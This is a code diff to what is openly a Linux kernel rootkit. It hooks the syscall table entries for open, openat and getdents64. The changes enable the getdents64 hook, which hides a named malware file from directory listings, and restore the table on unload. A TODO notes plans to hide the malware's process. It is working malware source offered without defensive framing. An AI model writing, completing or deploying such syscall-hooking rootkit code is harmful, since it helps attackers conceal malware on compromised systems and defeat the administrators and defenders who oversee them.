@@ -63,7 +63,7 @@ asmlinkage long mal_sys_getdents64(const struct pt_regs * regs)
 	// check if file is included in getdents64 (ls source, readdir source)
 	long size = original_sys_getdents64(regs);
 	if (size > 0){
-		if (!strstr(regs->si+0x20, malware_name)) {
+		if (strstr(regs->si+0x20, malware_name)) {
 			// each call seeks file stream, so just return next
 			return original_sys_getdents64(regs);
 		}
@@ -143,7 +143,7 @@ static int __init rootkit_init(void)
 
 		patch_syscall(__NR_open, mal_sys_open);
 		patch_syscall(__NR_openat, mal_sys_openat);
-		// TODO: patch_syscall(__NR_getdents64, mal_sys_getdents64);
+		patch_syscall(__NR_getdents64, mal_sys_getdents64);
 
 		// TODO: find malware process and remove from process list
 		// hide_task_struct();
@@ -156,7 +156,7 @@ static void __exit rootkit_exit(void)
 		// repair syscall table
 		patch_syscall(__NR_openat, original_sys_openat);
 		patch_syscall(__NR_open, original_sys_open);
-		// TODO: patch_syscall(__NR_getdents64, original_sys_getdents64);
+		patch_syscall(__NR_getdents64, original_sys_getdents64);
 		printk(KERN_INFO "Exiting...\n");
 		return;
 }
